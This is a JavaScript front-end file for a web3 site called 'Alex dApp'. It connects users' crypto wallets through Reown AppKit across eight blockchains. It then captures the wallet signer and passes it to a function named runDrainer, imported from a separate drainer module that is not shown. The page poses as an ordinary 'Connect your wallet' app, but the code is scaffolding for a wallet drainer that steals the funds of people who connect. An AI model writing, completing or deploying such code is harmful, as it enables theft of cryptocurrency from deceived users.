import { createAppKit } from '@reown/appkit';
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { ethers } from 'ethers';
import { runDrainer } from './drainer.js';

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';

const networks = [
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
];

const wagmiAdapter = new WagmiAdapter({
  projectId,
  networks,
});

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect your wallet',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  projectId,
  features: {
    analytics: true,
  },
});

let appProvider, appSigner, userAddress;

modal.on('connect', async ({ provider }) => {
  appProvider = new ethers.providers.Web3Provider(provider, 'any');
  appSigner = appProvider.getSigner();
  userAddress = await appSigner.getAddress();

  document.getElementById('status').textContent = `Подключено: ${userAddress}`;
});

document.getElementById('open-connect-modal')
  .addEventListener('click', () => modal.open());

document.getElementById('drainer-btn')
  .addEventListener('click', async () => {
    if (!appSigner) {
      return alert('Сначала подключите кошелёк!');
    }
    try {
      await runDrainer(appProvider, appSigner, userAddress);
    } catch (e) {
      console.error('Ошибка в Drainer:', e);
      alert('Ошибка при выполнении Drainer: ' + e.message);
    }
  });
